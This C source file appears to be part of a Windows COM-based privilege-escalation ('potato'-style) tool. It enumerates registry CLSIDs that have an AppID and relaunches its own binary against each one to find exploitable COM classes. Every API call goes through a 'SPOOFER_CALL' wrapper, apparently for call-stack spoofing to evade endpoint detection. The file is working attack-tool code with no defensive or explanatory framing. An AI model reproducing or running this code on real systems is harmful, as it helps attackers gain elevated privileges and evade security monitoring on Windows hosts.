#include "Header.h"

#include "BruteforceCLSIDs.h"
#include "stdio.h"
#include "strsafe.h"

void InitConsole(PHANDLE oldStdOut, PHANDLE oldStdErr, PBOOL consoleAllocated) {
	
	*oldStdOut = SPOOFER_CALL(GetStdHandle)(STD_OUTPUT_HANDLE);
	*oldStdErr = SPOOFER_CALL(GetStdHandle)(STD_ERROR_HANDLE);

	if (SPOOFER_CALL(GetConsoleWindow)() == NULL)
	{
		SPOOFER_CALL(AllocConsole)();
		*consoleAllocated = TRUE;
	}

	HANDLE hStdout = SPOOFER_CALL(CreateFileW)(L"CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	SPOOFER_CALL(SetStdHandle)(STD_OUTPUT_HANDLE, hStdout);
	SPOOFER_CALL(SetStdHandle)(STD_ERROR_HANDLE, hStdout);
}

void RestoreStdHandles(HANDLE oldStdOut, HANDLE oldStdErr) {
	SPOOFER_CALL(SetStdHandle)(STD_OUTPUT_HANDLE, oldStdOut);
	SPOOFER_CALL(SetStdHandle)(STD_ERROR_HANDLE, oldStdErr);
}

void getAllClsids(wchar_t* allClsids, DWORD* allClisdsNum) {
	HKEY hKey;
	DWORD retCode;
	WCHAR keyName[MAX_PATH];
	WCHAR keyValue[MAX_PATH];
	DWORD keyNameLen = MAX_PATH * sizeof(WCHAR);
	DWORD keyValueLen = MAX_PATH * sizeof(WCHAR);
	DWORD countRegKeys = 0;
	size_t offsetAllClsids = 0;
	DWORD skippedKeys = 0;

	SPOOFER_CALL(RegOpenKeyExW)(HKEY_CLASSES_ROOT, L"CLSID", 0, KEY_READ, &hKey);

	do 
	{
		retCode = SPOOFER_CALL(RegEnumKeyW)(hKey, countRegKeys, keyName, keyNameLen);
		countRegKeys++;

		if (keyName[0] != L'{') 
		{
			skippedKeys++;
			continue;
		}
		
		if (SPOOFER_CALL(RegGetValueW)(hKey, keyName, L"APPID", RRF_RT_ANY, NULL, keyValue, &keyValueLen) == ERROR_SUCCESS) 
		{
			memcpy(allClsids + offsetAllClsids, keyName, (wcslen(keyName) + 1) * sizeof(WCHAR));
			offsetAllClsids += wcslen(keyName) + 1;
		}
		else
		{
			skippedKeys++;
		}

		keyValueLen = MAX_PATH * sizeof(WCHAR);
	} while (retCode != ERROR_NO_MORE_ITEMS);

	*allClisdsNum = countRegKeys + 1 - skippedKeys;
	SPOOFER_CALL(RegCloseKey)(hKey);
}

void BruteforceAllClisds() {
	PWCHAR allClids = NULL;
	PWCHAR clsidPtr = NULL;
	DWORD allClidsNum = 0;
	PROCESS_INFORMATION procInfo;
	STARTUPINFO startInfo;
	wchar_t moduleFilename[MAX_PATH], newCmdline[MAX_PATH];
	wchar_t cmdlineTemplate[] = L"%s %s \"%s\" %s";
	HANDLE hOldStdOut, hOldStdErr;
	BOOL consoleAllocated = FALSE;

	allClids = (PWCHAR)SPOOFER_CALL(HeapAlloc)(SPOOFER_CALL(GetProcessHeap)(), HEAP_ZERO_MEMORY, 20000 * MAX_PATH * sizeof(WCHAR));
	clsidPtr = allClids;
	getAllClsids(allClids, &allClidsNum);
	printf("[*] Bruteforcing %d CLSIDs... \n", allClidsNum);

	// in this function we take care of the cases in which our current process does not have an allocated console
	InitConsole(&hOldStdOut, &hOldStdErr, &consoleAllocated);

	do 
	{
		memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
		memset(&startInfo, 0, sizeof(STARTUPINFO));
		memset(moduleFilename, 0, MAX_PATH);
		memset(newCmdline, 0, MAX_PATH);
		SPOOFER_CALL(GetModuleFileNameW)(NULL, moduleFilename, MAX_PATH);
		StringCchPrintfW(newCmdline, MAX_PATH, cmdlineTemplate, moduleFilename, L"-c", clsidPtr, L"-z");
		SPOOFER_CALL(CreateProcessW)(moduleFilename, newCmdline, NULL, NULL, FALSE, 0, NULL, NULL, &startInfo, &procInfo);
		if (SPOOFER_CALL(WaitForSingleObject)(procInfo.hProcess, 1500) == WAIT_TIMEOUT) 
		{
			SPOOFER_CALL(TerminateThread)(procInfo.hThread, -1);
			SPOOFER_CALL(TerminateProcess)(procInfo.hProcess, -1);
		}
		SPOOFER_CALL(CloseHandle)(procInfo.hThread);
		SPOOFER_CALL(CloseHandle)(procInfo.hProcess);
		clsidPtr += wcslen(clsidPtr) + 1;
		fflush(stdout);
	} while (*clsidPtr != L'\0');

	RestoreStdHandles(hOldStdOut, hOldStdErr);

	if (consoleAllocated)
	{
		SPOOFER_CALL(FreeConsole)();
	}
		
	SPOOFER_CALL(HeapFree)(SPOOFER_CALL(GetProcessHeap)(), 0, allClids);
}